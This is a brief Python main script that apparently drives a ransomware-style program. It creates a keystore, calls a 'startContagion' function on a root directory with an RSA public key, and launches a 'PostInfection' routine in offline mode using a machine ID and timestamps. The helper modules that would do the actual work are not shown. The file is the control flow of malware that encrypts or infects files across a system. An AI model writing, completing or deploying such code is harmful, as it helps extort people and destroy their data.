import starter
import utils
from postInfection import PostInfection

starter.keyStoreCreate(utils.version, utils.what_is_my_id)
starter.startContagion(utils.root_directory, utils.rsa_public_key)
PostInfection("offline", utils.what_is_my_id , utils.when_did_i_work, utils.rsa_public_key).firstWork()